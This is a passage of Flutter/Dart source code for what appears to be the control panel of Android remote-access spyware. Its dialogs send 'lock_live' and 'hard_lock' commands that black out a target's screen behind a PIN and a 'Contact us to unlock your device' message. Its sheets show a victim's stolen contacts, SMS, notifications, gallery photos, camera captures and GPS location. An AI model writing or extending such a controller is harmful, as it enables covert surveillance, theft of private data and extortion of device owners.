                  child: Container(
                    decoration: BoxDecoration(
                      gradient: const LinearGradient(colors: [_kRed, Colors.redAccent]),
                      borderRadius: BorderRadius.circular(12),
                      boxShadow: [BoxShadow(color: _kRed.withOpacity(0.4), blurRadius: 10)],
                    ),
                    child: ElevatedButton.icon(
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.transparent,
                        shadowColor: Colors.transparent,
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                      ),
                      icon: const Icon(Icons.stop_rounded, color: Colors.white, size: 18),
                      label: const Text('STOP', style: TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold)),
                      onPressed: () { _stopLive(); Navigator.pop(ctx); },
                    ),
                  ),
                ),
              ]),
            ),
          ]),
        ),
      ),
    ).then((_) => _stopLive());
  }

  void _lockLiveDialog() {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: _kCard,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: _kRed.withOpacity(0.5))),
      title: const Text('Lock Blanks screen', style: TextStyle(color: _kRed, fontSize: 15, fontWeight: FontWeight.bold)),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        const Text(' target screen will black out freeze', style: TextStyle(color: _kSub, fontSize: 12)),
        const SizedBox(height: 14),
        _field(msgCtrl, 'Nothing', hint: 'This device is locked by administrator'),
        const SizedBox(height: 12),
        _field(pinCtrl, 'ATLAS By @ErlanMods', hint: '1234', isNum: true),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('Cancel', style: TextStyle(color: _kSub))),
        Container(
          decoration: BoxDecoration(
            gradient: const LinearGradient(colors: [_kRed, Color(0xFFB71C1C)]),
            borderRadius: BorderRadius.circular(12),
          ),
          child: ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
            onPressed: () {
              Navigator.pop(context);
              final msg = msgCtrl.text.trim().isEmpty ? 'THIS DEVICE IS LOCKED BY ADMINISTRATOR' : msgCtrl.text.trim();
              final pin = pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
              _cmd('lock_live', extra: '$msg|$pin');
            },
            child: const Text('LAUNCH BLANKS', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ),
      ],
    ));
  }

  void _lockChatDialog() {
    final msgCtrl  = TextEditingController();
    final pinCtrl  = TextEditingController();
    final chatCtrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: _kCard,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: _kBlue.withOpacity(0.5))),
      title: const Text('Blanks Screen', style: TextStyle(color: _kBlue, fontSize: 15, fontWeight: FontWeight.bold)),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        _field(msgCtrl, 'Me or You?', hint: 'Example: Device locked by administrator'),
        const SizedBox(height: 12),
        _field(pinCtrl, 'Nothing', hint: '1234', isNum: true),
        const SizedBox(height: 12),
        _field(chatCtrl, 'This is Sxc apps', hint: 'Contact us to unlock your device'),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('Cancel', style: TextStyle(color: _kSub))),
        Container(
          decoration: BoxDecoration(
            gradient: const LinearGradient(colors: [_kBlue, Color(0xFF01579B)]),
            borderRadius: BorderRadius.circular(12),
          ),
          child: ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
            onPressed: () {
              Navigator.pop(context);
              final msg = msgCtrl.text.trim().isEmpty ? 'THIS DEVICE IS LOCKED BY ADMINISTRATOR' : msgCtrl.text.trim();
              final pin = pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
              _cmd('hard_lock', extra: '$msg|$pin');
              if (chatCtrl.text.trim().isNotEmpty) {
                Future.delayed(const Duration(milliseconds: 500), () => _sendChat(chatCtrl.text.trim()));
              }
            },
            child: const Text('LAUNCH NOW', style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)),
          ),
        ),
      ],
    ));
  }

  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(context: context, builder: (_) => StatefulBuilder(
      builder: (ctx, ss) => AlertDialog(
        backgroundColor: _kCard,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: _kBord)),
        title: const Text('Select Camera', style: TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.bold)),
        content: Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: ['back','front'].map((v) {
          final isSel = sel == v;
          final color = v == 'back' ? _kRed : _kBlue;
          return GestureDetector(
            onTap: () => ss(() => sel = v),
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 200),
              padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 16),
              decoration: BoxDecoration(
                color: isSel ? color.withOpacity(0.1) : Colors.transparent,
                borderRadius: BorderRadius.circular(14),
                border: Border.all(color: isSel ? color : _kBord, width: isSel ? 2 : 1),
              ),
              child: Column(children: [
                Icon(v == 'back' ? Icons.camera_rear_rounded : Icons.camera_front_rounded, color: isSel ? color : _kSub, size: 32),
                const SizedBox(height: 8),
                Text(v == 'back' ? 'Back' : 'Front', style: TextStyle(color: isSel ? color : _kSub, fontSize: 12, fontWeight: FontWeight.w600)),
              ]),
            ),
          );
        }).toList()),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('Cancel', style: TextStyle(color: _kSub))),
          Container(
            decoration: BoxDecoration(
              gradient: const LinearGradient(colors: [_kRed, Color(0xFFB71C1C)]),
              borderRadius: BorderRadius.circular(12),
            ),
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
              onPressed: () { Navigator.pop(ctx); onPick(sel); },
              child: const Text('SELECT', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
            ),
          ),
        ],
      ),
    ));
  }

  void _inputDialog(String title, String label, Function(String) onDone, {bool isNumber = false, String hint = ''}) {
    final ctrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: _kCard,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: _kBord)),
      title: Text(title, style: const TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.bold)),
      content: _field(ctrl, label, hint: hint, isNum: isNumber),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('Cancel', style: TextStyle(color: _kSub))),
        Container(
          decoration: BoxDecoration(
            gradient: const LinearGradient(colors: [_kBlue, Color(0xFF01579B)]),
            borderRadius: BorderRadius.circular(12),
          ),
          child: ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
            onPressed: () { Navigator.pop(context); onDone(ctrl.text.trim()); },
            child: const Text('SEND', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ),
      ],
    ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // DATA DISPLAY (DIPERBAIKI - KURUNG TUTUP)
  // ─────────────────────────────────────────────────────────────────────────
  void _fetchNotif() async {
    _addLog('Fetching notifications...');
    try {
      final res = await http.get(Uri.parse('${ApiConfig.baseUrl}/api/get-notifications/$_id'));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('${list.length} notifications');
        showModalBottomSheet(
          context: context,
          backgroundColor: _kCard,
          isScrollControlled: true,
          shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(24))),
          builder: (_) => DraggableScrollableSheet(
            initialChildSize: 0.6,
            maxChildSize: 0.9,
            expand: false,
            builder: (_, sc) => Column(
              children: [
                Container(
                  height: 4,
                  width: 40,
                  margin: const EdgeInsets.only(top: 14, bottom: 10),
                  decoration: BoxDecoration(color: _kPurp, borderRadius: BorderRadius.circular(4)),
                ),
                const Text('NOTIFICATIONS', style: TextStyle(color: _kText, fontWeight: FontWeight.bold, fontSize: 14, letterSpacing: 1)),
                const SizedBox(height: 8),
                Expanded(
                  child: ListView.separated(
                    controller: sc,
                    padding: const EdgeInsets.symmetric(horizontal: 14),
                    itemCount: list.length,
                    separatorBuilder: (_, __) => Divider(color: _kBord, height: 1),
                    itemBuilder: (_, i) => ListTile(
                      contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                      leading: Container(
                        width: 42,
                        height: 42,
                        decoration: BoxDecoration(
                          color: _kPurp.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(color: _kPurp.withOpacity(0.3)),
                        ),
                        child: const Icon(Icons.notifications_rounded, color: _kPurp, size: 20),
                      ),
                      title: Text(
                        list[i]['title']?.toString() ?? '-',
                        style: const TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w600),
                      ),
                      subtitle: Text(
                        list[i]['body']?.toString() ?? '',
                        style: const TextStyle(color: _kSub, fontSize: 11),
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        );
      }
    } catch (_) {
      _addLog('Notif error');
    }
  }

  void _imgDialog(String b64, String title) {
    try {
      final c = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(c);
      showDialog(context: context, builder: (_) => Dialog(
        backgroundColor: _kBg,
        insetPadding: const EdgeInsets.all(12),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _kBlue.withOpacity(0.5), width: 1.5),
        ),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Padding(padding: const EdgeInsets.all(16),
            child: Text(title, style: const TextStyle(color: _kText, fontWeight: FontWeight.bold, fontSize: 14))),
          ClipRRect(
            borderRadius: const BorderRadius.vertical(bottom: Radius.circular(18)),
            child: Image.memory(bytes, fit: BoxFit.contain),
          ),
        ]),
      ));
    } catch (_) { _toast('Image decode failed'); }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: _kCard,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: _kGreen.withOpacity(0.5))),
      title: const Text('GPS Location', style: TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.bold)),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        Text('Latitude:  $lat', style: const TextStyle(color: _kGreen, fontFamily: 'monospace', fontSize: 13)),
        const SizedBox(height: 6),
        Text('Longitude: $lng', style: const TextStyle(color: _kGreen, fontFamily: 'monospace', fontSize: 13)),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('Close', style: TextStyle(color: _kSub))),
        Container(
          decoration: BoxDecoration(
            gradient: const LinearGradient(colors: [_kGreen, Color(0xFF1B5E20)]),
            borderRadius: BorderRadius.circular(12),
          ),
          child: ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
            onPressed: () => launchUrl(Uri.parse('https://www.google.com/maps/search/?api=1&query=$lat,$lng'), mode: LaunchMode.externalApplication),
            child: const Text('OPEN MAPS', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ),
      ],
    ));
  }

  void _textDialog(String title, String content) {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: _kCard,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: _kBord)),
      title: Text(title, style: const TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.bold)),
      content: Container(
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: _kBg,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: _kBord),
        ),
        child: SelectableText(content, style: const TextStyle(color: _kCyan, fontFamily: 'monospace', fontSize: 12)),
      ),
      actions: [TextButton(onPressed: () => Navigator.pop(context), child: const Text('Close', style: TextStyle(color: _kSub)))],
    ));
  }

  void _contactsSheet(List contacts) {
    showModalBottomSheet(context: context, backgroundColor: _kCard,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(24))),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.9,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(height: 4, width: 40, margin: const EdgeInsets.only(top: 14, bottom: 10),
              decoration: BoxDecoration(color: _kRed, borderRadius: BorderRadius.circular(4))),
            Text('CONTACTS (${contacts.length})', style: const TextStyle(color: _kText, fontWeight: FontWeight.bold, fontSize: 14, letterSpacing: 1)),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.separated(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: contacts.length,
                separatorBuilder: (_, __) => Divider(color: _kBord, height: 1),
                itemBuilder: (_, i) => ListTile(
                  contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                  leading: Container(
                    width: 42, height: 42,
                    decoration: BoxDecoration(
                      color: _kRed.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: _kRed.withOpacity(0.3)),
                    ),
                    child: const Icon(Icons.person_rounded, color: _kRed, size: 20),
                  ),
                  title: Text(contacts[i]['name']?.toString() ?? '-', style: const TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w600)),
                  subtitle: Text(contacts[i]['number']?.toString() ?? '-', style: const TextStyle(color: _kSub, fontSize: 11)),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _smsSheet(List sms) {
    showModalBottomSheet(context: context, backgroundColor: _kCard,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(24))),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.7,
        maxChildSize: 0.95,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(height: 4, width: 40, margin: const EdgeInsets.only(top: 14, bottom: 10),
              decoration: BoxDecoration(color: _kCyan, borderRadius: BorderRadius.circular(4))),
            Text('SMS (${sms.length})', style: const TextStyle(color: _kText, fontWeight: FontWeight.bold, fontSize: 14, letterSpacing: 1)),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.separated(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: sms.length,
                separatorBuilder: (_, __) => Divider(color: _kBord, height: 1),
                itemBuilder: (_, i) {
                  final s = sms[i] as Map;
                  return ListTile(
                    contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                    leading: Container(
                      width: 42, height: 42,
                      decoration: BoxDecoration(
                        color: _kCyan.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: _kCyan.withOpacity(0.3)),
                      ),
                      child: const Icon(Icons.sms_rounded, color: _kCyan, size: 20),
                    ),
                    title: Text(s['address']?.toString() ?? '-', style: const TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w600)),
                    subtitle: Text(s['body']?.toString() ?? '', style: const TextStyle(color: _kSub, fontSize: 11), maxLines: 2, overflow: TextOverflow.ellipsis),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _gallerySheet(List imgs) {
    showModalBottomSheet(context: context, backgroundColor: _kCard,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(24))),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.75,
        maxChildSize: 0.95,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(height: 4, width: 40, margin: const EdgeInsets.only(top: 14, bottom: 10),
              decoration: BoxDecoration(color: _kPurp, borderRadius: BorderRadius.circular(4))),
            Text('GALLERY (${imgs.length})', style: const TextStyle(color: _kText, fontWeight: FontWeight.bold, fontSize: 14, letterSpacing: 1)),
            const SizedBox(height: 8),
            Expanded(
              child: imgs.isEmpty
                  ? const Center(child: Text('No photos found', style: TextStyle(color: _kSub)))
                  : GridView.builder(
                      controller: sc,
                      padding: const EdgeInsets.all(10),
                      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                        crossAxisCount: 3,
                        crossAxisSpacing: 8,
                        mainAxisSpacing: 8,
                      ),
                      itemCount: imgs.length,
                      itemBuilder: (_, i) {
                        try {
                          final raw = imgs[i].toString();
                          final clean = raw.contains(',') ? raw.split(',').last : raw;
                          final bytes = base64Decode(clean);
                          return GestureDetector(
                            onTap: () => _imgDialog(raw, 'Gallery Photo ${i+1}'),
                            child: ClipRRect(
                              borderRadius: BorderRadius.circular(12),
                              child: Image.memory(bytes, fit: BoxFit.cover),
                            ),
                          );
                        } catch (_) {
                          return Container(decoration: BoxDecoration(color: _kBg, borderRadius: BorderRadius.circular(12)));
                        }
                      },
                    ),
            ),
          ],
        ),
      ),
    );
  }

  // ─────────────────────────────────────────────────────────────────────────
  // UI HELPERS (PREMIUM)
  // ─────────────────────────────────────────────────────────────────────────
  Widget get _gap => const SizedBox(height: 14);

  Widget _header(String title, String sub) => Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
    ShaderMask(
      shaderCallback: (bounds) => const LinearGradient(colors: [_kRed, _kBlue]).createShader(bounds),
      child: Text(title, style: const TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.w700, letterSpacing: 1)),
    ),
    const SizedBox(height: 6),
    Text(sub, style: const TextStyle(color: _kSub, fontSize: 11, letterSpacing: 0.3)),
    const SizedBox(height: 8),
    Container(
      height: 2,
      width: 60,
      decoration: BoxDecoration(
        gradient: const LinearGradient(colors: [_kRed, _kBlue]),
        borderRadius: BorderRadius.circular(2),
      ),
    ),
  ]);

  // PREMIUM NEON SINGLE BUTTON
  Widget _neonSingleBtn(String label, IconData icon, Color color, VoidCallback fn, {bool isDestructive = false}) =>
    GestureDetector(
      onTap: fn,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        margin: const EdgeInsets.symmetric(vertical: 4),
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        decoration: BoxDecoration(
          color: _kCard,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: color.withOpacity(0.4), width: 1.5),
          boxShadow: [
            BoxShadow(color: color.withOpacity(isDestructive ? 0.25 : 0.12), blurRadius: 16, spreadRadius: 1),
          ],
        ),
        child: Row(children: [
          Container(
            width: 46, height: 46,
            decoration: BoxDecoration(
              gradient: LinearGradient(colors: [color.withOpacity(0.2), color.withOpacity(0.05)], begin: Alignment.topLeft, end: Alignment.bottomRight),
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: color.withOpacity(0.3), width: 1),
            ),
            child: Icon(icon, color: color, size: 22),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Text(label, style: TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w700, letterSpacing: 1.2)),
          ),
          Container(
            width: 34, height: 34,
            decoration: BoxDecoration(
              color: color.withOpacity(0.1),
              shape: BoxShape.circle,
              border: Border.all(color: color.withOpacity(0.3)),
            ),
            child: Icon(Icons.arrow_forward_rounded, color: color, size: 18),
          ),
        ]),
      ),
    );

  // PREMIUM NEON DUAL BUTTON
  Widget _neonDualBtn({
    required String leftLabel, required IconData leftIcon, required Color leftColor, required VoidCallback leftFn,
    required String rightLabel, required IconData rightIcon, required Color rightColor, required VoidCallback rightFn,
  }) => Row(children: [
    Expanded(
      child: GestureDetector(
        onTap: leftFn,
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 16),
          decoration: BoxDecoration(
            color: _kCard,
            borderRadius: const BorderRadius.only(topLeft: Radius.circular(16), bottomLeft: Radius.circular(16)),
            border: Border.all(color: leftColor.withOpacity(0.4), width: 1.5),
            boxShadow: [BoxShadow(color: leftColor.withOpacity(0.12), blurRadius: 14, spreadRadius: 1)],
          ),
          child: Column(children: [
            Container(
              width: 44, height: 44,
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [leftColor.withOpacity(0.2), leftColor.withOpacity(0.05)], begin: Alignment.topLeft, end: Alignment.bottomRight),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: leftColor.withOpacity(0.3)),
              ),
              child: Icon(leftIcon, color: leftColor, size: 22),
            ),
            const SizedBox(height: 12),
            Text(leftLabel, textAlign: TextAlign.center,
                style: TextStyle(color: leftColor, fontSize: 11, fontWeight: FontWeight.w800, letterSpacing: 1.2)),
          ]),
        ),
      ),
    ),
    Container(width: 2, height: 100, color: _kBord),
    Expanded(
      child: GestureDetector(
        onTap: rightFn,
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 16),
          decoration: BoxDecoration(
            color: _kCard,
            borderRadius: const BorderRadius.only(topRight: Radius.circular(16), bottomRight: Radius.circular(16)),
            border: Border.all(color: rightColor.withOpacity(0.4), width: 1.5),
            boxShadow: [BoxShadow(color: rightColor.withOpacity(0.12), blurRadius: 14, spreadRadius: 1)],
          ),
          child: Column(children: [
            Container(
              width: 44, height: 44,
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [rightColor.withOpacity(0.2), rightColor.withOpacity(0.05)], begin: Alignment.topLeft, end: Alignment.bottomRight),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: rightColor.withOpacity(0.3)),
              ),
              child: Icon(rightIcon, color: rightColor, size: 22),
            ),
            const SizedBox(height: 12),
            Text(rightLabel, textAlign: TextAlign.center,
                style: TextStyle(color: rightColor, fontSize: 11, fontWeight: FontWeight.w800, letterSpacing: 1.2)),
          ]),
        ),
      ),
    ),
  ]);

  Widget _infoRow(String num, String text, Color color) => Padding(
    padding: const EdgeInsets.symmetric(vertical: 5),
    child: Row(children: [
      Container(
        width: 24, height: 24,
        decoration: BoxDecoration(
          color: color.withOpacity(0.15),
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: color.withOpacity(0.3)),
        ),
        child: Center(child: Text(num, style: TextStyle(color: color, fontSize: 11, fontWeight: FontWeight.bold))),
      ),
      const SizedBox(width: 14),
      Expanded(child: Text(text, style: const TextStyle(color: _kSub, fontSize: 11, height: 1.4))),
    ]),
  );

  Widget _field(TextEditingController ctrl, String label, {String hint = '', bool isNum = false}) =>
    TextField(
      controller: ctrl,
      keyboardType: isNum ? TextInputType.number : TextInputType.text,
      style: const TextStyle(color: _kText, fontSize: 14),
      decoration: InputDecoration(
        labelText: label,
        hintText: hint,
        labelStyle: const TextStyle(color: _kSub, fontSize: 12, fontWeight: FontWeight.w500),
        hintStyle: const TextStyle(color: _kSub, fontSize: 12),
        filled: true,
        fillColor: _kBg,
        contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        border: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: const BorderSide(color: _kBord)),
        enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: const BorderSide(color: _kBord)),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(14),
          borderSide: const BorderSide(color: _kBlue, width: 2),
        ),
      ),
    );
}